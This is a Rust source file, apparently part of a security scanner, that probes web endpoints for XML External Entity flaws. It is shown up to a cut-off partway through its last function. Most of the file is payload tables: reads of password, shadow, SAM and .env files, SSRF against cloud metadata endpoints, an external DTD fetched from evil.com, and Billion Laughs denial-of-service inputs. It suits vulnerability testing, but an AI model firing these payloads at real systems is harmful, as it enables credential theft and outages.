//! XXE (XML External Entity) Injection scanner
//!
//! Detects XXE vulnerabilities through various payload types:
//! - File read attacks (local file disclosure)
//! - SSRF attacks (internal network scanning)
//! - Blind XXE (out-of-band data exfiltration)
//! - DoS attacks (Billion Laughs, quadratic blowup)
//!
//! Parser fingerprinting identifies the XML processing backend
//! to tailor exploitation attempts.

use crate::scanners::{ScanReport, ScannerConfig, Target, Vuln, VulnSeverity};
use anyhow::Result;
use reqwest::Client;
use std::time::Duration;
use std::time::Instant;

/// XXE payload types with their characteristics
#[derive(Debug, Clone)]
pub struct XxePayload {
    /// The XML payload to send
    pub payload: String,
    /// Attack technique description
    pub technique: XxeTechnique,
    /// Expected signature if vulnerable
    pub signature: Option<String>,
    /// Expected time delay for time-based detection (ms)
    pub time_delay: Option<u64>,
}

/// XXE attack techniques
#[derive(Debug, Clone, PartialEq)]
pub enum XxeTechnique {
    /// Direct file read via SYSTEM entity
    FileRead,
    /// File read with parameter entity (blind)
    FileReadParameter,
    /// File read via DTD external entity
    FileReadDtd,
    /// SSRF via HTTP entity
    SsrfHttp,
    /// SSRF via gopher/other protocols
    SsrfOther,
    /// Blind XXE with out-of-band callback
    BlindOob,
    /// Blind XXE with error-based exfiltration
    BlindError,
    /// Billion Laughs DoS
    BillionLaughs,
    /// Quadratic blowup DoS
    QuadraticBlowup,
    /// XML parameter entity polyglot
    ParameterPolyglot,
}

impl XxeTechnique {
    /// Get severity for this technique type
    pub fn severity(&self) -> VulnSeverity {
        match self {
            XxeTechnique::FileRead
            | XxeTechnique::FileReadParameter
            | XxeTechnique::FileReadDtd => VulnSeverity::Critical,
            XxeTechnique::SsrfHttp
            | XxeTechnique::SsrfOther => VulnSeverity::High,
            XxeTechnique::BlindOob
            | XxeTechnique::BlindError
            | XxeTechnique::ParameterPolyglot => VulnSeverity::High,
            XxeTechnique::BillionLaughs
            | XxeTechnique::QuadraticBlowup => VulnSeverity::Medium,
        }
    }

    /// Get description for this technique
    pub fn description(&self) -> &'static str {
        match self {
            XxeTechnique::FileRead => "Direct XML External Entity for local file disclosure",
            XxeTechnique::FileReadParameter => "Parameter entity for file read (bypasses some filters)",
            XxeTechnique::FileReadDtd => "External DTD for file read",
            XxeTechnique::SsrfHttp => "XXE used for Server-Side Request Forgery via HTTP",
            XxeTechnique::SsrfOther => "XXE used for SSRF via alternative protocols",
            XxeTechnique::BlindOob => "Blind XXE with out-of-band data exfiltration",
            XxeTechnique::BlindError => "Blind XXE with error-based exfiltration",
            XxeTechnique::BillionLaughs => "Billion Laughs XML DoS attack",
            XxeTechnique::QuadraticBlowup => "Quadratic blowup XML DoS attack",
            XxeTechnique::ParameterPolyglot => "Parameter entity polyglot for multiple parsers",
        }
    }
}

/// Identified XML parser fingerprint
#[derive(Debug, Clone, PartialEq)]
pub enum XmlParser {
    /// libxml2 (PHP, Python, Ruby, etc.)
    Libxml2,
    /// Java SAX/DOM/XStream
    JavaSax,
    /// .NET XmlDocument/XmlDocument
    DotNet,
    /// Python xml.etree.ElementTree
    PythonElementTree,
    /// Python defusedxml (safe)
    PythonDefusedxml,
    /// PHP SimpleXML
    PhpSimplexml,
    /// PHP DOMDocument
    PhpDomdocument,
    /// Go encoding/xml
    GoXml,
    /// JavaScript DOMParser
    JsDomparser,
    /// Unknown parser
    Unknown,
}

impl XmlParser {
    /// Get description of the parser
    pub fn description(&self) -> &'static str {
        match self {
            XmlParser::Libxml2 => "libxml2 - Vulnerable to XXE by default",
            XmlParser::JavaSax => "Java SAX/DOM - DocumentBuilderFactory vulnerable by default",
            XmlParser::DotNet => ".NET XmlDocument - Vulnerable to XXE",
            XmlParser::PythonElementTree => "Python xml.etree - Vulnerable without defusedxml",
            XmlParser::PythonDefusedxml => "Python defusedxml - XXE protection enabled",
            XmlParser::PhpSimplexml => "PHP SimpleXML - Vulnerable to XXE",
            XmlParser::PhpDomdocument => "PHP DOMDocument - Vulnerable (disable_entity_loader needed)",
            XmlParser::GoXml => "Go encoding/xml - XXE protection since Go 1.17",
            XmlParser::JsDomparser => "JavaScript DOMParser - Browser has XXE protection",
            XmlParser::Unknown => "Unknown XML parser",
        }
    }

    /// Check if parser is typically vulnerable
    pub fn is_vulnerable(&self) -> bool {
        !matches!(self, XmlParser::PythonDefusedxml | XmlParser::JsDomparser)
    }
}

/// Parameter names commonly accepting XML input
const XML_PARAMS: &[&str] = &[
    "xml", "data", "payload", "body", "content", "request", "message", "config",
    "file", "document", "soap", "envelope", "feed", "rss", "atom", "svg",
    "input", "query", "filter", "search", "export", "import", "upload",
];

/// File read payloads - targeting different OS files
const FILE_READ_PAYLOADS: &[(&str, &str, Option<&str>)] = &[
    // Linux files
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "etc_passwd", Some("root:")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>", "etc_shadow", Some("nobody:")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>", "etc_hosts", Some("localhost")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/issue\">]><foo>&xxe;</foo>", "etc_issue", Some("\\n ")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/motd\">]><foo>&xxe;</foo>", "etc_motd", Some("Welcome")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>", "proc_environ", Some("PATH=")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/version\">]><foo>&xxe;</foo>", "proc_version", Some("Linux")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/cmdline\">]><foo>&xxe;</foo>", "proc_cmdline", Some("/")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/cwd\">]><foo>&xxe;</foo>", "proc_cwd", Some("/")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/apache2/apache2.conf\">]><foo>&xxe;</foo>", "apache_conf", Some("ServerRoot")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/nginx/nginx.conf\">]><foo>&xxe;</foo>", "nginx_conf", Some("server")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/log/apache2/access.log\">]><foo>&xxe;</foo>", "apache_access", Some("Apache")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/log/nginx/access.log\">]><foo>&xxe;</foo>", "nginx_access", Some("nginx")),

    // Windows files
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>", "win_ini", Some("[extensions]")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><foo>&xxe;</foo>", "win_hosts", Some("localhost")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><foo>&xxe;</foo>", "boot_ini", Some("[boot]")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/config/sam\">]><foo>&xxe;</foo>", "sam_file", None),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/config/system\">]><foo>&xxe;</foo>", "system_file", None),

    // MacOS files
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "macos_passwd", Some("root:")),

    // Web application files
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/www/html/.env\">]><foo>&xxe;</foo>", "env_file", Some("DB_")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///app/.env\">]><foo>&xxe;</foo>", "docker_env", Some("DB_")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///app/config.php\">]><foo>&xxe;</foo>", "config_php", Some("<?php")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///app/wp-config.php\">]><foo>&xxe;</foo>", "wp_config", Some("DB_PASSWORD")),
];

/// SSRF payloads for internal network scanning
const SSRF_PAYLOADS: &[(&str, &str, Option<&str>)] = &[
    // Internal HTTP endpoints
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost/admin\">]><foo>&xxe;</foo>", "localhost_http", Some("<html")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost:8080\">]><foo>&xxe;</foo>", "localhost_8080", Some("<html")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:22\">]><foo>&xxe;</foo>", "ssh_banners", Some("SSH")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>", "aws_metadata", Some("ami-id")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1/\">]><foo>&xxe;</foo>", "gcp_metadata", Some("instance")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://100.100.100.200/latest/meta-data/\">]><foo>&xxe;</foo>", "aliyun_metadata", Some("instance-id")),

    // Alternative protocol SSRF
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"gopher://localhost:22\">]><foo>&xxe;</foo>", "gopher_ssh", None),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///dev/tcp/127.0.0.1/22\">]><foo>&xxe;</foo>", "dev_tcp", None),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"ftp://internal/\">]><foo>&xxe;</foo>", "ftp_internal", None),

    // Cloud metadata endpoints
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/user-data\">]><foo>&xxe;</foo>", "aws_userdata", None),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/dynamic/instance-identity/document\">]><foo>&xxe;</foo>", "aws_identity", Some("{\"")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1/instance/hostname\">]><foo>&xxe;</foo>", "gcp_hostname", None),
];

/// Parameter entity payloads (bypass some filters)
const PARAMETER_ENTITY_PAYLOADS: &[(&str, &str, Option<&str>)] = &[
    // Classic parameter entity
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">%xxe;]><foo></foo>", "param_basic", Some("root:")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">%xxe;]><foo></foo>", "param_dtd", None),

    // Nested parameter entities
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % trigger \"<!ENTITY exfil SYSTEM 'file:///etc/passwd'>\">%trigger;%xxe;]><foo>&exfil;</foo>", "nested_param", Some("root:")),

    // Blind XXE with out-of-band
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://BURP_COLLABORATOR\">%xxe;]><foo></foo>", "blind_oob", None),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://127.0.0.1:80\">%xxe;]><foo></foo>", "blind_local", None),

    // Error-based XXE
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/nonexistent\">]><foo>&xxe;</foo>", "error_file", Some("No such file")),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % exfil \"<!ENTITY content SYSTEM 'file:///etc/passwd'>\">%exfil;%xxe;]><foo>&content;</foo>", "error_param", Some("root:")),
];

/// DoS payloads - Billion Laughs and variants
const DOS_PAYLOADS: &[(&str, &str, Option<u64>)] = &[
    // Classic Billion Laughs
    ("<?xml version=\"1.0\"?><!DOCTYPE lol [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;\"><!ENTITY lol4 \"&lol3;&lol3;\"><!ENTITY lol5 \"&lol4;&lol4;\"><!ENTITY lol6 \"&lol5;&lol5;\"><!ENTITY lol7 \"&lol6;&lol6;\"><!ENTITY lol8 \"&lol7;&lol7;\"><!ENTITY lol9 \"&lol8;&lol8;\">]><foo>&lol9;</foo>", "billion_laughs", Some(5000)),
    ("<?xml version=\"1.0\"?><!DOCTYPE lol [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;\">]><foo>&lol3;</foo>", "million_laughs", Some(10000)),

    // Quadratic blowup
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" >]><foo>&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;</foo>", "quadratic_blowup", Some(3000)),

    // Entity expansion loop
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY a \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\"><!ENTITY b \"&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;\"><!ENTITY c \"&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;\"><!ENTITY d \"&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;\"><!ENTITY e \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\">]><foo>&a;</foo>", "entity_loop", Some(5000)),
];

/// SOAP-specific XXE payloads
const SOAP_PAYLOADS: &[(&str, &str, Option<&str>)] = &[
    ("<?xml version=\"1.0\"?><soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"><soap:Body><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo></soap:Body></soap:Envelope>", "soap_file", Some("root:")),
    ("<?xml version=\"1.0\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo></soap:Body></soap:Envelope>", "soap12_file", Some("root:")),
    ("<?xml version=\"1.0\"?><Envelope xmlns=\"http://schemas.xmlsoap.org/soap/envelope/\"><Body><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo></Body></Envelope>", "soap_ssrf", Some("ami-id")),

    // SOAPAction-based attacks
    ("<?xml version=\"1.0\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Header><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]></soap:Header><soap:Body>&xxe;</soap:Body></soap:Envelope>", "soap_header", Some("root:")),

    // WS-Security with XXE
    ("<?xml version=\"1.0\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Header><wsse:Security xmlns:wsse=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd\"><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]></wsse:Security></soap:Header><soap:Body/></soap:Envelope>", "soap_security", Some("root:")),
];

/// SVG-based XXE payloads (file upload)
const SVG_PAYLOADS: &[(&str, &str, Option<&str>)] = &[
    ("<?xml version=\"1.0\" standalone=\"yes\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><text>&xxe;</text></svg>", "svg_file", Some("root:")),
    ("<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><image href=\"&xxe;\"/></svg>", "svg_image", Some("root:")),
    ("<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><text>&xxe;</text></svg>", "svg_ssrf", Some("ami-id")),
    ("<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><script><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]></script></svg>", "svg_script", Some("root:")),

    // SVG with XXE in style
    ("<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><style>@import \"&xxe;\";</style></svg>", "svg_style", Some("root:")),
];

/// Excel/XLSX XML-based XXE
const XLSX_PAYLOADS: &[(&str, &str, Option<&str>)] = &[
    ("<?xml version=\"1.0\"?><Workbook xmlns=\"urn:schemas-microsoft-com:office:spreadsheet\"><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><Worksheet>&xxe;</Worksheet></Workbook>", "xlsx_workbook", Some("root:")),
    ("<?xml version=\"1.0\"?><sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><si>&xxe;</si></sst>", "xlsx_shared", Some("root:")),
];

/// DOCX XML-based XXE
const DOCX_PAYLOADS: &[(&str, &str, Option<&str>)] = &[
    ("<?xml version=\"1.0\"?><w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><w:body>&xxe;</w:body></w:document>", "docx_document", Some("root:")),
    ("<?xml version=\"1.0\"?><pkg:package xmlns:pkg=\"http://schemas.microsoft.com/office/2006/xmlPackage\"><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><pkg:part>&xxe;</pkg:part></pkg:package>", "docx_package", Some("root:")),
];

/// RSS/Atom feed XXE payloads
const FEED_PAYLOADS: &[(&str, &str, Option<&str>)] = &[
    ("<?xml version=\"1.0\"?><rss version=\"2.0\"><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><channel><title>&xxe;</title></channel></rss>", "rss_file", Some("root:")),
    ("<?xml version=\"1.0\"?><feed xmlns=\"http://www.w3.org/2005/Atom\"><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><title>&xxe;</title></feed>", "atom_file", Some("root:")),
    ("<?xml version=\"1.0\"?><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><rdf:Description>&xxe;</rdf:Description></rdf:RDF>", "rdf_file", Some("root:")),
];

/// Polymorphic/obfuscated XXE payloads
const POLYMORPHIC_PAYLOADS: &[(&str, &str, Option<&str>)] = &[
    // Mixed case entity declarations
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"><!ENTITY XxE SYSTEM \"file:///etc/hosts\">]><foo>&xxe;&XxE;</foo>", "mixed_case", Some("root:")),

    // Comment-based obfuscation
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM <!--comment-->\"file:///etc/passwd\">]><foo>&xxe;</foo>", "comment_obfu", Some("root:")),

    // CDATA-based
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo><![CDATA[&xxe;]]></foo>", "cdata_wrap", Some("root:")),

    // Multiple DOCTYPEs
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><!DOCTYPE bar [<!ENTITY bar SYSTEM \"file:///etc/hosts\">]><foo>&xxe;&bar;</foo>", "multi_doctype", Some("root:")),

    // Entity within entity
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"><!ENTITY nested \"&xxe;\">]><foo>&nested;</foo>", "nested_entity", Some("root:")),

    // SYSTEM with base64 encoding
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=file:///etc/passwd\">]><foo>&xxe;</foo>", "php_filter", Some("cm9vdD")),
];

pub struct XxeScanner {
    client: Client,
    config: ScannerConfig,
}

impl XxeScanner {
    pub fn new(config: ScannerConfig) -> Self {
        let timeout = Duration::from_secs(15);
        let client = Client::builder()
            .timeout(timeout)
            .user_agent(&config.user_agent)
            .redirect(reqwest::redirect::Policy::limited(2))
            .build()
            .expect("Failed to create HTTP client for XXE scanner");

        Self { client, config }
    }

    pub async fn scan(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Always perform basic XXE checks
        report.merge(self.check_file_read(url).await?);
        report.merge(self.check_ssrf(url).await?);
        report.merge(self.check_svg_upload(url).await?);

        // Aggressive mode: advanced techniques
        if self.config.aggressive {
            report.merge(self.check_parameter_entities(url).await?);
            report.merge(self.check_soap_endpoints(url).await?);
            report.merge(self.check_blind_xxe(url).await?);
            report.merge(self.check_dos(url).await?);
            report.merge(self.check_polymorphic(url).await?);
            report.merge(self.check_office_docs(url).await?);
            report.merge(self.check_feeds(url).await?);
        }

        Ok(report)
    }

    /// Check for basic file read XXE
    async fn check_file_read(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        for (payload, _target, signature) in FILE_READ_PAYLOADS {
            for param in XML_PARAMS {
                if let Some(vuln) = self.test_xxe_payload(url, param, payload, XxeTechnique::FileRead, *signature).await? {
                    report.add_finding(vuln);
                    break;
                }
            }
        }

        Ok(report)
    }

    /// Check for SSRF via XXE
    async fn check_ssrf(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        for (payload, _target, signature) in SSRF_PAYLOADS {
            for param in XML_PARAMS {
                if let Some(vuln) = self.test_xxe_payload(url, param, payload, XxeTechnique::SsrfHttp, *signature).await? {
                    report.add_finding(vuln);
                    break;
                }
            }
        }

        Ok(report)
    }

    /// Check for parameter entity XXE
    async fn check_parameter_entities(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        for (payload, _target, signature) in PARAMETER_ENTITY_PAYLOADS {
            for param in XML_PARAMS {
                if let Some(vuln) = self.test_xxe_payload(url, param, payload, XxeTechnique::FileReadParameter, *signature).await? {
                    report.add_finding(vuln);
                    break;
                }
            }
        }

        Ok(report)
    }

    /// Check for SVG-based XXE (file upload)
    async fn check_svg_upload(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        for (payload, _target, signature) in SVG_PAYLOADS {
            // Try upload endpoints
            let upload_params = &["file", "image", "avatar", "logo", "icon", "upload", "document"];

            for param in upload_params {
                if let Some(vuln) = self.test_xxe_payload(url, param, payload, XxeTechnique::FileReadDtd, *signature).await? {
                    report.add_finding(vuln);
                    break;
                }
            }
        }

        Ok(report)
    }

    /// Check for SOAP-specific XXE
    async fn check_soap_endpoints(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        for (payload, _target, signature) in SOAP_PAYLOADS {
            if let Some(vuln) = self.test_xxe_direct(url, payload, XxeTechnique::FileRead, *signature).await? {
                report.add_finding(vuln);
                break;
            }
        }

        Ok(report)
    }

    /// Check for blind XXE vulnerabilities
    async fn check_blind_xxe(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Test for error-based XXE
        let error_payload = r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent/xyz123.txt">]><foo>&xxe;</foo>"#;

        for param in &["xml", "data", "payload", "body"] {
            let test_url = if url.contains('?') {
                format!("{}&{}={}", url, param, urlencoding::encode(error_payload))
            } else {
                format!("{}?{}={}", url, param, urlencoding::encode(error_payload))
            };

            let start = Instant::now();
            if let Ok(response) = self.client.post(&test_url).header("Content-Type", "application/xml").body(error_payload.to_string()).send().await {
                let _duration = start.elapsed();

                if let Ok(text) = response.text().await {
                    let text_lower = text.to_lowercase();

                    // Check for error messages indicating file access
                    if text_lower.contains("no such file") || text_lower.contains("cannot open")
                        || text_lower.contains("failed to load") || text_lower.contains("entity")
                        || text_lower.contains("permission denied") || text_lower.contains("i/o error") {

                        report.add_finding(Vuln {
                            severity: VulnSeverity::High,
                            title: "Blind XXE: Error-Based Detection".to_string(),
                            description: "The XML parser reveals error messages about file/entity access, indicating potential XXE vulnerability.".to_string(),
                            location: Some(test_url),
                            recommendation: Some("Disable external entities in XML parser. Use defusedxml or equivalent. Sanitize error messages.".to_string()),
                            cwe: Some("CWE-611".to_string()),
                            owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
                        });
                        break;
                    }
                }
            }
        }

        Ok(report)
    }

    /// Check for DoS vulnerabilities (Billion Laughs)
    async fn check_dos(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        for (payload, target, _expected_delay) in DOS_PAYLOADS {
            // First, baseline request
            let _baseline = if let Ok(resp) = self.client.post(url).header("Content-Type", "application/xml").body("<foo>test</foo>").send().await {
                resp.text().await.unwrap_or_default()
            } else {
                continue;
            };

            // Send DoS payload with timeout protection
            let start = Instant::now();
            let result = tokio::time::timeout(
                Duration::from_secs(10),
                self.client.post(url).header("Content-Type", "application/xml").body(payload.to_string()).send()
            ).await;

            let duration = start.elapsed();

            match result {
                Ok(Ok(response)) => {
                    // Server processed it (possibly slowly or crashed)
                    if let Ok(text) = response.text().await {
                        // If response is different from baseline or took suspiciously long
                        if duration.as_millis() > 2000 || text.is_empty() {
                            report.add_finding(Vuln {
                                severity: XxeTechnique::BillionLaughs.severity(),
                                title: format!("XXE DoS: {}", target),
                                description: format!("XML expansion attack (Billion Laughs) caused {}ms delay. Server may be vulnerable to XML DoS.", duration.as_millis()),
                                location: Some(url.to_string()),
                                recommendation: Some("Configure XML parser with entity expansion limits. Use secure XML libraries like defusedxml. Set maximum entity size and depth.".to_string()),
                                cwe: Some("CWE-776".to_string()),
                                owasp: Some("A04:2021 - Insecure Design".to_string()),
                            });
                            break;
                        }
                    }
                }
                Ok(Err(_)) | Err(_) => {
                    // Timeout or error - indicates DoS vulnerability
                    if duration.as_secs() >= 8 {
                        report.add_finding(Vuln {
                            severity: XxeTechnique::BillionLaughs.severity(),
                            title: format!("XXE DoS: {} (Timeout)", target),
                            description: format!("XML expansion attack caused server timeout/hang ({}ms). Critical DoS vulnerability.", duration.as_millis()),
                            location: Some(url.to_string()),
                            recommendation: Some("Disable DTDs entirely. Configure entity expansion limits. Use safe XML parsers with protection against billion laughs attacks.".to_string()),
                            cwe: Some("CWE-776".to_string()),
                            owasp: Some("A04:2021 - Insecure Design".to_string()),
                        });
                        break;
                    }
                }
            }
        }

        Ok(report)
    }

    /// Check polymorphic/obfuscated XXE payloads
    async fn check_polymorphic(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        for (payload, _target, signature) in POLYMORPHIC_PAYLOADS {
            for param in XML_PARAMS {
                if let Some(vuln) = self.test_xxe_payload(url, param, payload, XxeTechnique::ParameterPolyglot, *signature).await? {
                    report.add_finding(vuln);
                    break;
                }
            }
        }

        Ok(report)
    }

    /// Check Office document XXE (XLSX, DOCX)
    async fn check_office_docs(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

